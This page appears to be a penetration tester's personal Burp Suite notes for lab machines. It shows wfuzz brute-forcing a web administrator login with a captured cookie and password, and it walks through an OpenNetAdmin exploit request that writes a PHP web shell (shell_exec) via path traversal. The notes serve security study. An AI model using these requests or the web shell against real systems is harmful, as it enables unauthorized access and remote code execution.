# 💢 burpsuite
Tags: #💢
Related to: 
See also: [[wfuzz]]
Previous: [[Web Application Analysis]]

---
## Description

Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities.

## Usage Examples

### Intercept traffic using burpsuite

1. Enable Proxy => Intercept is on
2. Use Burp's embedded browser.
3. Browse to 10.129.171.59/administrator
4. Forward until login page is loaded.
5. Set username to FUZZ
6. Set password to Curling2018!
7. Click Login
8. Copy cookie and post data:

		99fb082d992a92668ce87e5540bd20fa=omf6d7fp9a02939ooeqahd5dnl
		
		username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d36732e30d0405ece8d5e1e1e343928b=1

#### Replaces anywhere FUZZ is in all caps with a line from wordlist

##### Proxied through burp

Note: If you're going to proxy wfuzz through burp, make sure the ip and port match the options!

Proxy => Options => Proxy Listeners => 127.0.0.1:8080

	fuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' -p 127.0.0.1:8080 http://10.129.171.59/administrator/index.php

```
-w cewl.out										// wordlist
-c												// color output  
-d 												// post data  
-b												// cookie  
-p												// proxy (burp)  
http://10.129.161.239/administrator/index.php	// target

You can exclude results with one of the following:  

--hl 114										// hide results using 114 lines.  
--hc 200										// hide results using 200 response code.

After getting a correct login, you get an authentication cookie which may then cause the remaining items in the wordlist to return success responses.
```

##### Not proxied through burp

	wfuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' http://10.129.171.59/administrator/index.php

### Send exploit through Burp proxy

Test in regular browser:

	localhost	// Run in firefox

Run in Burp:

1. Make sure Burp "Intercept is on".
2. "Open Browser" and browse to localhost.
3. Burp => Proxy => Forward to load exploit html from server into browser.
4. Change exploit "URL" from localhost to target in Firefox.
5. Change PHP to something benign to test with:

```
From:	<?php echo shell_exec($_GET[1]) ?>

To:		<?php echo("Please Subscribe"); ?>
```

6. "Exploit!"
7. Change Raw POST

```
From:	POST / HTTP/1.1

To:		POST /ona/dcm.php HTTP/1.1
```

```
POST /ona/dcm.php HTTP/1.1
Host: localhost
Content-Length: 209
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

options%5Bdesc%5D=%3C%3Fphp+echo%28%22Please+Subscribe%22%29%3B+%3F%3E&module=add_module&options%5Bname%5D=mandat0ry&options%5Bfile%5D=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fona.log
```

8. <Ctrl+R> to send to Repeater.
9. <Ctrl+Shift+R> to switch to Repeater tab.
10. Burp Repeater => upper right, above inspector - Change exploit from localhost to target (10.129.187.158 Port: 80).
11. Send.


### Shortcuts
	<Ctrl+R>		// Send Proxy Intercept to Repeater  
	<Ctrl+Shift+R>	// Switch to that tab.
	
---
## References
- http://portswigger.net/burp/